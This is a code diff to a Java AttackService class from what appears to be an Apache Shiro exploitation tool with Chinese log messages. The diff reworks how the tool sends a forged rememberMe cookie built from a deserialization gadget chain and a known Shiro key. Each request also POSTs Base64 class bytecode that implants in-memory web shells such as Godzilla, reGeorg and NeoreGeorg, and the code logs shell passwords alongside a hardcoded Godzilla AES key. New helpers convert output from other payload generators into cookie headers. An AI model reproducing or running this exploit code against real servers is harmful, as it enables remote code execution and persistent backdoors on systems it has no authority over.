@@ -752,85 +752,129 @@ public class AttackService {
         boolean changeKeyMode = outputSink != null;
         String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
         if (injectRememberMe != null) {
-            HashMap<String, String> header = new HashMap();
-            header.put("Cookie", injectRememberMe);
-            header.put("p", shellPass);
-            header.put("path", shellPath);
-
             try {
                 String b64Bytecode = MemBytes.getBytes(memShellType);
-                String postString = "user=" + b64Bytecode;
-                String result = this.bodyHttpRequest(header, postString);
-                if (result.contains("->|Success|<-") || result.contains("->|change key ok|<-")) {
-                    String httpAddress = Utils.UrlToDomain(this.url);
-                    if (changeKeyMode || result.contains("->|change key ok|<-")) {
-                        logArea.appendText(Utils.log("[修改结果] 成功"));
-                        logArea.appendText(Utils.log("[新 Key] " + shellPass));
-                    } else {
-                        logArea.appendText(Utils.log("[注入结果] 成功"));
-                        logArea.appendText(Utils.log("[类型] " + memShellType));
-                    }
-                    if (!changeKeyMode && shellPath != null && !shellPath.isEmpty()) {
-                        logArea.appendText(Utils.log("[路径] " + httpAddress + shellPath));
-                    }
-                    if (!changeKeyMode && !result.contains("->|change key ok|<-") && memShellType.contains("哥斯拉")) {
-                        logArea.appendText(Utils.log("[密码] " + shellPass));
-                        logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
-                        logArea.appendText(Utils.log("[加密方式] AES"));
-                    } else if (!changeKeyMode && !result.contains("->|change key ok|<-") && !memShellType.equals("reGeorg[Servlet]") && !memShellType.equals("reGeorg[Filter]")) {
-                        logArea.appendText(Utils.log("[密码] " + shellPass));
-                    }
-                    if (!changeKeyMode && !result.contains("->|change key ok|<-") && memShellType.contains("NeoreGeorg")) {
-                        logArea.appendText(Utils.log("[提示] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
-                    }
-                } else {
-                    if (result.contains("->|") && result.contains("|<-")) {
-                        logArea.appendText(Utils.log("[服务端响应] " + result));
-                    }
-
-                    String httpAddress = Utils.UrlToDomain(this.url);
-                    boolean alreadyExists = result.contains("Filter already exists") || result.contains("Servlet already exists");
-                    if (alreadyExists) {
-                        logArea.appendText(Utils.log("[注入结果] 已存在，目标可能已经注入成功"));
-                        if (!changeKeyMode && shellPath != null && !shellPath.isEmpty()) {
-                            logArea.appendText(Utils.log("[路径] " + httpAddress + shellPath));
-                        }
-                        if (!changeKeyMode && memShellType.contains("哥斯拉")) {
-                            logArea.appendText(Utils.log("[密码] " + shellPass));
-                            logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
-                            logArea.appendText(Utils.log("[加密方式] AES"));
-                        } else if (!changeKeyMode && !memShellType.equals("reGeorg[Servlet]") && !memShellType.equals("reGeorg[Filter]")) {
-                            logArea.appendText(Utils.log("[密码] " + shellPass));
-                        }
-                        if (!changeKeyMode && memShellType.contains("NeoreGeorg")) {
-                            logArea.appendText(Utils.log("[提示] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
-                        }
-                    } else {
-                        if (changeKeyMode) {
-                            logArea.appendText(Utils.log("[修改结果] 失败，请检查当前利用链、目标环境或重试其他变体"));
-                        } else {
-                            logArea.appendText(Utils.log("[注入结果] 失败，请更换注入类型或者更换新路径"));
-                        }
-                    }
+                if (b64Bytecode == null || b64Bytecode.isEmpty()) {
+                    logArea.appendText(Utils.log("[异常] 未找到内存马模板: " + memShellType));
+                    logArea.appendText(Utils.log("-------------------------------------------------"));
+                    return;
                 }
+                this.injectMemWithCookieAndUserBody(injectRememberMe, b64Bytecode, shellPass, shellPath, logArea, changeKeyMode, memShellType);
+                logArea.appendText(Utils.log("-------------------------------------------------"));
             } catch (Exception var10) {
                 logArea.appendText(Utils.log("[异常] " + var10.getMessage()));
+                logArea.appendText(Utils.log("-------------------------------------------------"));
             }
-
-            logArea.appendText(Utils.log("-------------------------------------------------"));
         }
 
     }
 
     /**
-     * 使用主界面选中的 Shiro 利用链 + InjectMemTool 生成 Cookie，POST {@code user=} + 类字节码 Base64（与内存马注入一致）。
+     * 主界面「内存马注入」与「内存马生成 → Shiro 注入」共用：Cookie=InjectMemTool 的 rememberMe，POST {@code user=}&lt;Base64&gt;，附带 p/path。
+     *
+     * @param memTypeLabel 成功日志中的类型名；用于哥斯拉 / NeoreGeorg / reGeorg 等分支（jMG 可传含 GODZILLA 的英文标签）
+     */
+    private String injectMemWithCookieAndUserBody(String injectRememberMe, String userBase64Body, String shellPass,
+                                                  String shellPath, TextArea logArea, boolean changeKeyMode,
+                                                  String memTypeLabel) {
+        if (injectRememberMe == null || injectRememberMe.isEmpty()) {
+            return null;
+        }
+        String userPart = userBase64Body == null ? "" : userBase64Body.trim().replaceAll("\\s+", "");
+        if (userPart.isEmpty()) {
+            return null;
+        }
+        String label = memTypeLabel != null ? memTypeLabel : "内存马";
+        String ul = label.toUpperCase(Locale.ROOT);
+        boolean godzillaLike = label.contains("哥斯拉") || ul.contains("GODZILLA");
+        boolean neoreGeorgLike = label.contains("NeoreGeorg") || ul.contains("NEOREGEORG");
+        boolean reGeorgServlet = label.equals("reGeorg[Servlet]");
+        boolean reGeorgFilter = label.equals("reGeorg[Filter]");
+        HashMap<String, String> header = new HashMap<String, String>();
+        header.put("Cookie", injectRememberMe);
+        header.put("p", shellPass != null ? shellPass : "");
+        header.put("path", shellPath != null ? shellPath : "");
+        try {
+            String postString = "user=" + userPart;
+            String result = this.bodyHttpRequest(header, postString);
+            if (result.contains("->|Success|<-") || result.contains("->|change key ok|<-")) {
+                String httpAddress = Utils.UrlToDomain(this.url);
+                if (changeKeyMode || result.contains("->|change key ok|<-")) {
+                    logArea.appendText(Utils.log("[修改结果] 成功"));
+                    logArea.appendText(Utils.log("[新 Key] " + shellPass));
+                } else {
+                    logArea.appendText(Utils.log("[注入结果] 成功"));
+                    logArea.appendText(Utils.log("[类型] " + label));
+                }
+                if (!changeKeyMode && shellPath != null && !shellPath.isEmpty()) {
+                    logArea.appendText(Utils.log("[路径] " + httpAddress + shellPath));
+                }
+                if (!changeKeyMode && !result.contains("->|change key ok|<-") && godzillaLike) {
+                    logArea.appendText(Utils.log("[密码] " + shellPass));
+                    logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
+                    logArea.appendText(Utils.log("[加密方式] AES"));
+                } else if (!changeKeyMode && !result.contains("->|change key ok|<-") && !reGeorgServlet && !reGeorgFilter) {
+                    logArea.appendText(Utils.log("[密码] " + shellPass));
+                }
+                if (!changeKeyMode && !result.contains("->|change key ok|<-") && neoreGeorgLike) {
+                    logArea.appendText(Utils.log("[提示] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
+                }
+            } else {
+                if (result.contains("->|") && result.contains("|<-")) {
+                    logArea.appendText(Utils.log("[服务端响应] " + result));
+                }
+
+                String httpAddress = Utils.UrlToDomain(this.url);
+                boolean alreadyExists = result.contains("Filter already exists") || result.contains("Servlet already exists");
+                if (alreadyExists) {
+                    logArea.appendText(Utils.log("[注入结果] 已存在，目标可能已经注入成功"));
+                    if (!changeKeyMode && shellPath != null && !shellPath.isEmpty()) {
+                        logArea.appendText(Utils.log("[路径] " + httpAddress + shellPath));
+                    }
+                    if (!changeKeyMode && godzillaLike) {
+                        logArea.appendText(Utils.log("[密码] " + shellPass));
+                        logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
+                        logArea.appendText(Utils.log("[加密方式] AES"));
+                    } else if (!changeKeyMode && !reGeorgServlet && !reGeorgFilter) {
+                        logArea.appendText(Utils.log("[密码] " + shellPass));
+                    }
+                    if (!changeKeyMode && neoreGeorgLike) {
+                        logArea.appendText(Utils.log("[提示] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
+                    }
+                } else {
+                    if (changeKeyMode) {
+                        logArea.appendText(Utils.log("[修改结果] 失败，请检查当前利用链、目标环境或重试其他变体"));
+                    } else {
+                        logArea.appendText(Utils.log("[注入结果] 失败，请更换注入类型或者更换新路径"));
+                    }
+                }
+            }
+            return result;
+        } catch (Exception e) {
+            logArea.appendText(Utils.log("[异常] " + e.getMessage()));
+            logArea.appendText(Utils.log("-------------------------------------------------"));
+            return null;
+        }
+    }
+
+    /**
+     * 使用主界面选中的 Shiro 利用链 + InjectMemTool 生成 Cookie，POST {@code user=} + 类字节码 Base64（与 {@link #injectMem} 相同 HTTP 与结果解析）。
      */
     public String sendInjectMemToolExploit(String gadgetOpt, String shiroKey, String userBase64Payload, TextArea sink) {
-        return sendInjectMemToolExploit(gadgetOpt, shiroKey, userBase64Payload, "", "", sink);
+        return sendInjectMemToolExploit(gadgetOpt, shiroKey, userBase64Payload, "", "", sink, null);
     }
 
     public String sendInjectMemToolExploit(String gadgetOpt, String shiroKey, String userBase64Payload,
                                            String shellPass, String shellPath, TextArea sink) {
+        return sendInjectMemToolExploit(gadgetOpt, shiroKey, userBase64Payload, shellPass, shellPath, sink, null);
+    }
+
+    /**
+     * @param memTypeLabelForLog 成功/失败日志中的类型描述；jMG 建议传 {@code jMG/工具/Shell} 等以便匹配 Godzilla 等提示
+     */
+    public String sendInjectMemToolExploit(String gadgetOpt, String shiroKey, String userBase64Payload,
+                                           String shellPass, String shellPath, TextArea sink,
+                                           String memTypeLabelForLog) {
         String userPart = userBase64Payload == null ? "" : userBase64Payload.trim().replaceAll("\\s+", "");
         if (userPart.isEmpty()) {
             return null;
@@ -839,28 +883,20 @@ public class AttackService {
         if (rememberMe == null || rememberMe.isEmpty()) {
             return null;
         }
-        HashMap<String, String> header = new HashMap<String, String>();
-        header.put("Cookie", rememberMe);
-        header.put("p", shellPass != null ? shellPass : "");
-        header.put("path", shellPath != null ? shellPath : "");
         TextArea logArea = sink != null ? sink : this.mainController.logTextArea;
-        try {
-            String postString = "user=" + userPart;
-            String result = this.bodyHttpRequest(header, postString);
-            appendResponseSummary(logArea, "[Shiro+InjectMemTool] 已发送", result);
-            if (result != null) {
-                if (result.length() <= 2000) {
-                    logArea.appendText(Utils.log(result));
-                } else {
-                    logArea.appendText(Utils.log(result.substring(0, 500) + "..."));
-                }
+        String label = memTypeLabelForLog != null && !memTypeLabelForLog.trim().isEmpty()
+                ? memTypeLabelForLog.trim() : "内存马生成";
+        String result = this.injectMemWithCookieAndUserBody(rememberMe, userPart, shellPass, shellPath, logArea, false, label);
+        appendResponseSummary(logArea, "[Shiro+InjectMemTool] 已发送", result);
+        if (result != null) {
+            if (result.length() <= 2000) {
+                logArea.appendText(Utils.log(result));
+            } else {
+                logArea.appendText(Utils.log(result.substring(0, 500) + "..."));
             }
-            logArea.appendText(Utils.log("-------------------------------------------------"));
-            return result;
-        } catch (Exception e) {
-            logArea.appendText(Utils.log("[异常] " + e.getMessage()));
-            return null;
         }
+        logArea.appendText(Utils.log("-------------------------------------------------"));
+        return result;
     }
 
     public static boolean looksLikeRememberMeCookiePayload(String raw) {
@@ -873,6 +909,47 @@ public class AttackService {
             return false;
         }
         return t.substring(0, eq).trim().equalsIgnoreCase("rememberMe");
+    }
+
+    /**
+     * jEG 等工具常输出「仅密文」；与 Legacy 一致作为 Shiro Cookie 时应为 {@code rememberMe=密文}。
+     *
+     * @param headerNameHint jEG 返回的 {@code requestHeaderName}（如 Cookie、rememberMe），可为 null
+     */
+    public static String coerceRememberMeCookieHeader(String payload, String headerNameHint) {
+        if (payload == null) {
+            return null;
+        }
+        String p = payload.trim().replaceAll("\\s+", "");
+        if (p.isEmpty()) {
+            return null;
+        }
+        if (looksLikeRememberMeCookiePayload(p)) {
+            return p;
+        }
+        if (p.indexOf('=') >= 0) {
+            return null;
+        }
+        boolean hintRemember = headerNameHint != null
+                && ("rememberMe".equalsIgnoreCase(headerNameHint.trim())
+                || headerNameHint.toLowerCase(Locale.ROOT).contains("remember"));
+        boolean hintCookie = headerNameHint == null || "Cookie".equalsIgnoreCase(headerNameHint.trim());
+        if (p.length() >= 32 && (hintRemember || hintCookie)) {
+            return "rememberMe=" + p;
+        }
+        return null;
+    }
+
+    /** 得到可写入 {@code Cookie} 头的 rememberMe 行（含 {@code rememberMe=} 前缀）。 */
+    public static String resolveRememberMeCookieLine(String payload, String jegHeaderNameHint) {
+        if (payload == null) {
+            return null;
+        }
+        String p = payload.trim();
+        if (looksLikeRememberMeCookiePayload(p)) {
+            return p.replaceAll("\\s+", "");
+        }
+        return coerceRememberMeCookieHeader(p, jegHeaderNameHint);
     }
 
     /**
